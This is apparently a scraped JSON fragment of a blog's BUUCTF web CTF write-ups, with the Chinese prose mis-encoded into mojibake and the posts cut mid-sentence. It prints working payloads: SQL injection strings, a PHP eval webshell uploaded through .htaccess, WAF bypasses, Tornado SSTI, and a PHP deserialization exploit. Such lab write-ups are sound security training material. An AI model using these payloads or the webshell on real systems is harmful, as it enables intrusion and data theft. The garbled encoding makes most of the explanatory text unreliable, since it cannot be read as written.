‡å‡†ä»£ç ï¼ŒASCâ…¡ï¼‰æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç”µè„‘ç¼–ç ç³»ç»Ÿã€‚å®ƒä¸»è¦ç”¨äºæ˜¾ç¤ºç°ä»£è‹±è¯­å’Œå…¶ä»–è¥¿æ¬§è¯­è¨€ã€‚å®ƒæ˜¯ç°ä»Šæœ€é€šç”¨çš„ å•å­—èŠ‚ç¼–ç ç³»ç»Ÿï¼Œå¹¶ç­‰åŒäºå›½é™…æ ‡å‡†ISO/IEC 646ã€‚ ASCIIå­—ç¬¦é›†ç”±95ä¸ªå¯æ‰“å°å­—ç¬¦ï¼ˆ0x20-0x7Eï¼‰å’Œ33ä¸ªæ§åˆ¶å­—ç¬¦ï¼ˆ0x00-0x1Fï¼Œ0x7Fï¼‰ç»„æˆã€‚å¯æ‰“å°å­—ç¬¦ç”¨äºæ˜¾ç¤ºåœ¨è¾“å‡ºè®¾å¤‡ä¸Šï¼Œä¾‹å¦‚è§å±æˆ–è€…æ‰“å°çº¸ä¸Šï¼Œæ§åˆ¶å­—ç¬¦ç”¨äºå‘è®¡ç®—æœºå‘å‡ºä¸€äº›ç‰¹æ®ŠæŒ‡ä»¤ï¼Œä¾‹å¦‚0x07ä¼šè®©è®¡ç®—æœºå‘å‡ºå“”çš„ä¸€å£°ï¼Œ0x00é€šå¸¸ç”¨äºæŒ‡ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œ0x0Då’Œ0x0Aç”¨äºæŒ‡ç¤ºæ‰“å°æœºçš„æ‰“å°é’ˆå¤´é€€åˆ°è¡Œé¦–ï¼ˆå›è½¦ï¼‰å¹¶ç§»åˆ°ä¸‹ä¸€è¡Œï¼ˆæ¢è¡Œï¼‰ã€‚ ä¸å¯æ‰“å°å­—ç¬¦ï¼ˆæ§åˆ¶å­—ç¬¦ï¼‰ è½¬è½½äºï¼šhttps://blog.csdn.net/qq_38769551/article/details/101459811 ä¹ã€[GXYCTF2019]BabySQli1è€ƒç‚¹ï¼šSQL æ³¨å…¥ ä¹‹ è”åˆæŸ¥è¯¢ ç‰¹æ€§ï¼šä¸´æ—¶æ·»åŠ è™šæ‹Ÿç”¨æˆ·ï¼š è¿‡æ»¤äº† &#39;) &#39;)) &quot;) order floor order by &#39;1&#39;=&#39;1 é¡µé¢æºç ä¸­å¯ä»¥è·å¾— æ—  =ï¼ŒçŒœæµ‹æ˜¯ base32 ç¼–ç ï¼Œä¹‹å base64 è§£ç ï¼Œå¾—åˆ° 1select * from user where username = &#x27;$name&#x27; è¿‡æ»¤äº† order by ï¼Œä½†å±…ç„¶å¯ä»¥ Order by 1admin&#x27; Order by 3# è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œä¾‹å¦‚ï¼š åˆ™æˆ‘ä»¬æ„é€ ï¼Œåˆ¤æ–­å‡º ä¸‰åˆ—åˆ†åˆ«ä¸º id,username,password 11&#x27; union select 1,&#x27;admin&#x27;,&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;# ç„¶ååœ¨åŒæ—¶è¾“å…¥ password ä¸º 123456 å³å¯ åã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢1è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼  ä¹‹ .htaccess çš„ä½¿ç”¨ ç»è¿‡å°è¯•ï¼šä¿®æ”¹ Content-Type ç±»å‹ã€åç¼€ã€å†…å®¹ã€å›¾ç‰‡é©¬éƒ½ä¸å¯æˆåŠŸä¸Šä¼ ï¼Œä½¿ç”¨ä¹‹å‰çš„ GIFæ–‡ä»¶å¤´ä¿®æ”¹ ä¹Ÿä¸å¯ï¼Œå½“è¿‡æ»¤åˆ°å¦‚æ­¤åœ°æ­¥æ—¶ï¼Œå°±åº”è¯¥æƒ³åˆ° .htaccess å’Œ .user.ini æ–‡ä»¶äº†ã€‚ å°è¯• .user.ini ï¼Œæ²¡æœ‰ä¸Šä¼ æˆåŠŸ å°è¯• .htaccess ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå¾—åˆ°è·¯å¾„ ç´§æ¥ç€ä¸Šä¼  ma.png ï¼Œæ–‡ä»¶å†…å®¹æ˜¯ &lt;?php @eval($_REQUEST[&#39;aaa&#39;]); ?&gt; èšå‰‘è¿æ¥å³å¯ æ³¨æ„ï¼šè¿™é“é¢˜ç»è¿‡å°è¯•å‘ç°ï¼Œå¯ä»¥ä¸Šä¼  .png æ ¼å¼çš„æ–‡ä»¶ï¼Œä¸èƒ½ä¸Šä¼  .gif æ ¼å¼çš„æ–‡ä»¶ åä¸€ã€[MRCTF2020]Ez_bypass1è€ƒç‚¹ï¼šmd5 ç¢°æ’ã€PHP å¼±ç±»å‹ 12345678910111213141516171819202122232425262728293031323334353637383940I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first åˆ†æï¼š 1234567if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) #æ— æ³•ä½¿ç”¨ md5ç¢°æ’ï¼Œå¯æ•°ç»„æ³•ç»•è¿‡if (!is_numeric($passwd)) &#123; if($passwd==1234567)&#125;#ä½¿ç”¨ phpå¼±ç±»å‹ ç»•è¿‡ payloadï¼š 1234?id[]=QNKCDZO&amp;gg[]=s155964671a æˆ– ?id[]=a&amp;gg[]=s #åªè¦ä¸¤è€…ä¸åŒå³å¯#post ä¼ å‚ï¼š passwd=1234567asd åäºŒã€[GYCTF2020]Blacklist1è€ƒç‚¹ï¼šSQL æ³¨å…¥ æ•°å­—å‹æ³¨å…¥ï¼Œæœ‰æŠ¥é”™ 1return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 11&#x27; order by 2# #ä¸¤åˆ— å †å æ³¨å…¥ï¼š 11&#x27;;show databases;# 11&#x27;;show tables;# 11&#x27;;show columns from FlagHere;# 11&#x27;;show columns from words;# ä¸ä¹‹å‰çš„ä¸€å…³ç›¸åŒï¼Œæˆ‘ä»¬ç°åœ¨æ‰€æäº¤çš„æŸ¥è¯¢æ˜¯é’ˆå¯¹è¡¨ words çš„ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥åˆ°è¡¨ FlagHere ä¸­çš„å†…å®¹ã€‚ ç”±è¿‡æ»¤çš„æƒ…å†µå¯ä»¥çœ‹åˆ°ï¼Œä¹‹å‰çš„æ–¹æ³•ï¼šä½¿ç”¨ rename æˆ– alter ä¿®æ”¹è¡¨åçš„æ–¹æ³•è¡Œä¸é€šäº†ã€‚ ä½¿ç”¨ handler æŸ¥è¯¢ï¼š 11&#x27;;handler FlagHere open;handler FlagHere read first;# 12.1 æ€»ç»“ï¼šMysql æŸ¥è¯¢è¯­å¥ ä¹‹ Handlerå®˜æ–¹æ–‡æ¡£ mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œå®ƒæ¯æ¬¡åªèƒ½æŸ¥è¯¢1æ¡è®°å½•ï¼Œè€Œ select å¯ä»¥æ ¹æ®éœ€è¦è¿”å›å¤šæ¡æŸ¥è¯¢ç»“æœã€‚å› æ­¤ handlerè¯­ å¥å¹¶ä¸å…·å¤‡ select è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚ HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚ å¯ä»¥é™ä½ä¼˜åŒ–å™¨å¯¹äºSQLè¯­å¥çš„è§£æä¸ä¼˜åŒ–å¼€é”€ï¼Œä»è€Œæå‡æŸ¥è¯¢æ€§èƒ½ã€‚ æµ‹è¯•ï¼š 1234567891011create database practice;use practice;create table handler_table(id int,username varchar(10));desc handler_table;insert into handler_table values(1,&#x27;æå&#x27;);insert into handler_table values(2,&#x27;å°é©¬&#x27;);insert into handler_table values(3,&#x27;å¼ é‘«&#x27;);insert into handler_table values(4,&#x27;å‘¨æ˜&#x27;);insert into handler_table values(5,&#x27;è”¡ç´«&#x27;);select * from handler_tables; ä¸é€šè¿‡ç´¢å¼•æŸ¥è¡¨ï¼š 12345678910#æ‰“å¼€å¥æŸ„handler handler_table open;#æŸ¥è¯¢æ•°æ®handler handler_table read first;handler handler_table read next;handler handler_table read next;handler handler_table read next;handler handler_table read next;#å…³é—­å¥æŸ„handler handler_table close; 12345mysql&gt; handler handler_table close;Query OK, 0 rows affected (0.00 sec)mysql&gt; handler handler_table read next;ERROR 1109 (42S02): Unknown table &#x27;handler_table&#x27; in HANDLER é€šè¿‡ç´¢å¼•æŸ¥è¡¨ï¼šéœ€è¦åˆ›å»ºç´¢å¼• 1234567891011#ä»¥ handler_table ä¸­çš„ id å­—æ®µåˆ›å»ºç´¢å¼•ï¼Œå‘½åä¸º handler_indexcreate index handler_index on handler_table(id);#æ‰“å¼€å¥æŸ„ï¼Œå‘½åä¸º phandler handler_table open as p;#æŸ¥çœ‹æ•°æ®handler p read handler_index first;#ç¬¬ä¸€è¡Œhandler p read handler_index next;#ä¸‹ä¸€è¡Œhandler p read handler_index prev;#ä¸Šä¸€è¡Œhandler p read handler_index last;#æœ€åä¸€è¡Œ#å…³é—­å¥æŸ„handler p close; 123456789101112#ä»¥ handler_table ä¸­çš„ id å­—æ®µåˆ›å»ºç´¢å¼•ï¼Œå‘½åä¸º handler_indexcreate index handler_index on handler_table(id);#æ‰“å¼€å¥æŸ„handler handler_table open;#æŸ¥çœ‹ç‰¹å®šä½ç½®çš„æ•°æ®handler p handler_table read handler_index=(3);handler handler_table read handler_index first;#æŸ¥ç¬¬ä¸€æ¡handler handler_table read handler_index next;#æŸ¥ä¸‹ä¸€æ¡handler handler_table read handler_index prev;#æŸ¥ä¸Šä¸€æ¡handler handler_table read handler_index last;#æŸ¥æœ€åä¸€æ¡#å…³é—­å¥æŸ„handler handler_table close; 12#åˆ é™¤ç´¢å¼•drop index handler_index on handler_table; Handler ä¸ select çš„æ¯”è¾ƒï¼š selectè¯­å¥ä¸€æ¬¡è¿”å›æ‰€æœ‰ç›¸å…³è¡Œï¼Œhandleræ¯æ¬¡è¿”å›ä¸€è¡Œ HANDLERæ¶‰åŠçš„åˆ†æè¾ƒå°‘ï¼Œæ¯”SELECTæ›´å¿« æ²¡æœ‰ä¼˜åŒ–ç¨‹åºæˆ–æŸ¥è¯¢æ ¡éªŒå¼€é”€ åœ¨ä¸¤ä¸ªç®¡ç†ç¨‹åºè¯·æ±‚ä¹‹é—´ï¼Œä¸éœ€è¦é”å®šè¡¨ã€‚ å‚è€ƒ","categories":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/categories/BUUCTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"}],"author":"xizhi-future"},{"title":"BUUCTF-WEB(äºŒ)","slug":"BUUCTF-WEBï¼ˆäºŒï¼‰","date":"2021-06-04T10:22:55.000Z","updated":"2021-10-07T10:14:40.334Z","comments":true,"path":"2021/06/04/BUUCTF-WEBï¼ˆäºŒï¼‰/","link":"","permalink":"https://xizhi-future.github.io/2021/06/04/BUUCTF-WEB%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"æ¦‚è¿°ï¼šBUUCTF-WEB å~äºŒåé“é¢˜ç›®ï¼Œéš¾åº¦è¾ƒå‰åé“ç•¥æœ‰æå‡ï¼Œå†…å®¹æœ‰ï¼šæ–‡ä»¶ä¸Šä¼ ã€HTTP å¤´éƒ¨ã€SSTIã€PHPå­—ç¬¦ä¸²ç‰¹æ€§ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€SQLæ³¨å…¥ã€ç½‘ç«™çš„å¤‡ä»½æ–‡ä»¶ã€‚","text":"æ¦‚è¿°ï¼šBUUCTF-WEB å~äºŒåé“é¢˜ç›®ï¼Œéš¾åº¦è¾ƒå‰åé“ç•¥æœ‰æå‡ï¼Œå†…å®¹æœ‰ï¼šæ–‡ä»¶ä¸Šä¼ ã€HTTP å¤´éƒ¨ã€SSTIã€PHPå­—ç¬¦ä¸²ç‰¹æ€§ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€SQLæ³¨å…¥ã€ç½‘ç«™çš„å¤‡ä»½æ–‡ä»¶ã€‚ ä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife1è€ƒç‚¹ï¼šè¿ shell å·¥å…·ï¼šèœåˆ€ã€èšå‰‘ æ ¹æ®ç•Œé¢çš„æç¤ºï¼Œç›´æ¥ä¸Šèœåˆ€æˆ–è€…æ˜¯èšå‰‘ï¼Œæ ¹ç›®å½•ä¸‹å¾—åˆ° flag äºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http1è€ƒç‚¹ï¼šHTTP headerï¼šRefererã€User-Agentã€X-Forwarded-For æŠ“åŒ…æŸ¥çœ‹ å‘ç° Secret.phpï¼Œè®¿é—®å‘ç° 12#It doesn&#x27;t come from &#x27;https://www.Sycsecret.com&#x27;æ·»åŠ  Referer: https://www.Sycsecret.com 12#Please use &quot;Syclover&quot; browserä¿®æ”¹ User-Agent: Syclover 12#No!!! you can only read this locally!!!æ·»åŠ  X-Forwarded-For: 127.0.0.1 å¾—åˆ° flag æ€»ç»“ï¼š 1234567891011#HTTP headerRefererï¼š å½“æµè§ˆå™¨å‘WebæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ HTTP header å¸¦ä¸Šä¸­å¸¦ä¸Š Referer å­—æ®µï¼Œç”¨æ¥å‘Šè¯‰æµè§ˆå™¨ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ã€‚å¸¸ç”¨åœ¨é˜²ç›—é“¾å’Œé˜²æ¶æ„è¯·æ±‚ä¸­ã€‚User-Agentï¼š ç”¨äºä¼ è¾“ç”¨æˆ·ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆæµè§ˆå™¨ã€‚æœ‰äº›ç½‘ç«™ä¸ºäº†é˜²æ­¢çˆ¬è™«ï¼Œä¼šæ£€éªŒUser-Agentï¼Œåªæœ‰å½“æ˜¯ç”¨æˆ·è®¿é—®çš„æ—¶å€™æ‰ä¼šä¼ è¾“æ•°æ®ã€‚X-Forwarded-Forï¼š æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µï¼Œå³ç”¨æ¥è¡¨ç¤ºHTTPè¯·æ±‚ç«¯çš„çœŸå®IPã€‚ ç†è§£ï¼šå½“ä»Šå¤šæ•°ç¼“å­˜æœåŠ¡å™¨çš„ç”¨æˆ·ä¸ºå¤§å‹ISPï¼Œä¸ºäº†é€šè¿‡ç¼“å­˜çš„æ–¹å¼æ¥é™ä½ä»–ä»¬çš„å¤–éƒ¨å¸¦å®½ï¼Œä»–ä»¬å¸¸å¸¸é€šè¿‡é¼“åŠ±æˆ–å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨ä»£ç†æœåŠ¡å™¨æ¥æ¥å…¥äº’è”ç½‘ã€‚å¦‚æœæ²¡æœ‰ XFFï¼Œæ‰€æœ‰é€šè¿‡ä»£ç†æœåŠ¡å™¨çš„è¿æ¥åªä¼šæ˜¾ç¤ºä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œä¸ä¼šæ˜¾ç¤ºå‘èµ·è¯·æ±‚çš„åŸå§‹IPåœ°å€ï¼Œè€Œå¦‚æœè¿æ¥çš„åŸå§‹IPåœ°å€ä¸å¯å¾—ï¼Œæ¶æ„è®¿é—®çš„æ£€æµ‹ä¸é¢„é˜²çš„éš¾åº¦å°†å¤§å¤§å¢åŠ ã€‚ æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨é€æ˜ä»£ç†å»ä¸Šç½‘ï¼Œé‚£ä¹ˆåœ¨é€æ˜ä»£ç†å‘é€ç»™æœåŠ¡å™¨ç«¯çš„HTTPè¯·æ±‚ä¸­ä¼šåŒ…å«x-forward-forä¿¡æ¯ï¼Œç”¨æ¥ä¼ è¾“æœ€åŸå§‹çš„IPåœ°å€ã€‚ ä¸‰ã€[æŠ¤ç½‘2018]easy_tornado1è€ƒç‚¹ï¼šssti æŸ¥çœ‹ä¸‰ä¸ªæ–‡ä»¶å†…å®¹ 12345678/flag.txtflag in /fllllllllllllag/welcome.txtrender #æç¤ºï¼šSSTI æ¸²æŸ“/hints.txtmd5(cookie_secret+md5(filename)) #æˆ‘ä»¬éœ€è¦æ‰¾åˆ° cookie_secret æŠ“åŒ…æŸ¥çœ‹ï¼š æŸ¥çœ‹æ¯ä¸ªæ–‡ä»¶æ—¶ï¼ŒGETå°†ä¼šä¼ å…¥ä¸¤å‚æ•°ï¼šfilename å’Œ filehash ï¼Œç„¶åå›æ˜¾ç»™æˆ‘ä»¬æ–‡ä»¶å†…å®¹ã€‚ å‘ç°ï¼šå½“ä¼ å…¥çš„å‚æ•°å€¼é”™è¯¯æ—¶ï¼Œå°†è‡ªåŠ¨è·³è½¬è½¬åˆ° /error?msg=Error é¡µé¢ï¼Œå¹¶ä¸”å«å‚ ?msg= ï¼Œå°è¯• ?msg=&#123;&#123;3&#125;&#125;ï¼Œå¯ä»¥å›æ˜¾ï¼Œç´§æ¥ç€ ?msg=&#123;&#123;3*7&#125;&#125; ï¼Œè¿”å› æ˜¾ç„¶ï¼šè¢«è¿‡æ»¤æ‰äº† ä»é¢˜ç›®å¾—çŸ¥ï¼šTornado æ˜¯ä¸€ç§ Web æœåŠ¡å™¨è½¯ä»¶çš„å¼€æºç‰ˆæœ¬ã€‚Tornado å’Œä¸»æµWeb æœåŠ¡å™¨æ¡†æ¶ï¼ˆåŒ…æ‹¬å¤§å¤šæ•° Python çš„æ¡†æ¶ï¼‰æœ‰ç€æ˜æ˜¾çš„åŒºåˆ«ï¼šå®ƒæ˜¯éé˜»å¡å¼æœåŠ¡å™¨ï¼Œè€Œä¸”é€Ÿåº¦ç›¸å½“å¿«ã€‚ æœç´¢ Tornado æ¡†æ¶çš„é…ç½®æ–‡ä»¶ï¼šhandler.settings https://tornado-zh.readthedocs.io/zh/latest/web.html 1?msg=&#123;&#123;handler_settings&#125;&#125; # cookie_secret:72a8e052-2f41-47ce-92b6-63610540b665 123456&lt;?php$a = md5(&quot;/fllllllllllllag&quot;);echo md5(&quot;72a8e052-2f41-47ce-92b6-63610540b665&quot;.$a);?&gt;#ä¼ å…¥#?filename=/fllllllllllllag&amp;filehash=d7965e5b71144dc21155aa80d0bd721f å››ã€[RoarCTF 2019]Easy Calc1è€ƒç‚¹ï¼šPHP çš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ æŸ¥çœ‹æºç ï¼Œå‘ç° 1234567891011121314151617&lt;script&gt; $(&#x27;#calc&#x27;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&#x27;GET&#x27;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;); &#125; &#125;) return false; &#125;)&lt;/script&gt; è®¿é—® calc.php ï¼Œå¾—åˆ° 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; ä¸å…è®¸æˆ‘ä»¬ä¼ å…¥å­—æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ ? num= ï¼Œæ¥ç»•è¿‡ã€‚è¿‡ç¨‹æ˜¯ï¼šWAFæ£€æµ‹æ—¶æ£€æµ‹ä¸åˆ° &quot;num&quot; ï¼Œè¿™ä¸ªå˜é‡ï¼Œå› ä¸ºåªå­˜åœ¨ &quot; num&quot; ï¼Œè¿™æ ·å°±é¥¶è¿‡äº†WAFåˆ¤æ–­ï¼›éšåPHPåœ¨è§£æçš„æ—¶å€™ä¼šå°†è¿™ä¸ªç©ºæ ¼å»æ‰ï¼Œä»è€Œä½¿æˆ‘ä»¬çš„ä»£ç åœ¨åŒ…å«éæ³•å­—ç¬¦çš„æƒ…å†µä¸‹è¿˜èƒ½æ­£å¸¸è¿è¡Œã€‚ 1?%20num=qqq æ€è·¯ï¼šç»•è¿‡ WAFï¼Œå±é™©å‡½æ•°ä¼ å‚ æ³¨ï¼šç”±äº / è¢«è¿‡æ»¤æ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ascii ç¼–ç å‡½æ•° chr() 1/calc.php? num=var_dump(scandir(chr(47))) 1/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) å¾—åˆ° flag 4.1 æ€»ç»“ï¼šPHP å­—ç¬¦ä¸²è§£æç‰¹æ€§ æ¦‚è¿°ï¼šPHP åœ¨ç”¨ GETã€POSTç­‰ä¼ å…¥å‚æ•°ï¼ˆå³ä¼ å…¥æ‰€è¦æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼‰æ—¶ï¼Œä¼šå°†å…¶è½¬æ¢ä¸ºå†…éƒ¨å…³è”çš„ $_GET å’Œ $_POST ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬ä¼ å…¥ /?path=flag ï¼Œå°†ä¼šå˜ä¸º Array([path] =&gt; &quot;flag&quot;) ã€‚ ç‰¹æ€§ï¼šæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–è€…æ˜¯ç”¨ä¸‹ç¯çº¿æ¥ä»£æ›¿ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬ä¼ å…¥ /?%20msg[id%00=10 ï¼Œå®ƒä»å°†ä¼šè¢«è§£ææˆ Array([msg_id] =&gt; 10) ã€‚ åˆ©ç”¨ï¼šå½“æˆ‘ä»¬é‡åˆ°ä¼ å…¥çš„å‚æ•°åªå…è®¸æ˜¯æ•°å­—æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ /?%20msg[id%00=10 æ¥è¿›è¡Œç»•è¿‡WAFã€‚ PHP ä¼šå°†æ‰€æœ‰å‚æ•°è½¬æ¢æˆä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š åˆ é™¤ç©ºç™½å­—ç¬¦ï¼š%20 %00 å°†å˜ä¸ºç©º å°†æŸäº›å­—ç¬¦è½¬æ¢æˆä¸ºä¸‹åˆ’çº¿ï¼š+ [ ] ç­‰å°†å˜ä¸º _ æµ‹è¯•ï¼š 1parse_str() å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚ 12345#æµ‹è¯•ä»£ç &lt;?phpparse_str(&quot;msg_id=10&quot;,$a);print_r($a);?&gt; å¸¸è§åˆ©ç”¨ï¼š 1scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚ äº”ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1è€ƒç‚¹ï¼šç½‘ç«™å¤‡ä»½æ–‡ä»¶ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ– æ ¹æ®é¢˜ç›®çš„æç¤ºï¼šæœ‰è‰¯å¥½çš„å¤‡ä»½ç‹çœŸçš„ä¹ æƒ¯ã€‚å‘ç°ç½‘ç«™çš„å¤‡ä»½æ–‡ä»¶ï¼šwww.zip 1234#flag.php æ–‡ä»¶&lt;?php $flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;?&gt; 123456789101112131415161718192021222324252627282930313233343536#class.phpæ–‡ä»¶ï¼šå­˜åœ¨ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œæ¶‰åŠåˆ°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¼æ´&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; //æ³¨æ„æ˜¯ç§æœ‰æŒ‰é‡ private $password = &#x27;yesyes&#x27;; //æ³¨æ„æ˜¯ç§æœ‰æŒ‰é‡ public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; #åˆ›å»ºå¯¹è±¡ä¹‹åè¢«è°ƒç”¨ &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; #ååºåˆ—åŒ–æ—¶è¢«è§¦å‘ &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125; #å¯¹è±¡è¢«é”€æ¯æ—¶è¢«è§¦å‘&#125;?&gt; 123456#index.phpæ–‡ä»¶&lt;?php include &#x27;class.php&#x27;; //è°ƒç”¨ class.php $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select); //å¯¹è¾“å…¥è¿›è¡Œååºåˆ—åŒ–?&gt; å¯ä»¥å‘ç°ï¼Œå½“index.phpæ–‡ä»¶ä¸­å¯¹è¾“å…¥å†…å®¹è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå°†ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³• __wakeup()ï¼Œä»è€Œå°† username çš„å€¼è¿›è¡Œè¦†ç›–ä¸º guest ã€‚è€Œ __destruct() ä¸­æ˜æ˜¾çŸ¥é“åªæœ‰ username=admin æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤º flagã€‚å› æ­¤æˆ‘ä»¬å¿…é¡»ç»•è¿‡ __wakeup()ã€‚ æ„é€ ï¼š 12#æ„é€ ?select=O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; å¦å¤–ï¼Œä¸ºäº†é˜²æ­¢æˆ‘ä»¬åœ¨ä¼ å…¥ select ä¹‹åï¼Œåœ¨ index.php æ–‡ä»¶ä¸­å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ—¶è°ƒç”¨ __wakeup()ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€ä¸ªç‰¹æ€§ï¼Œå³ åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ 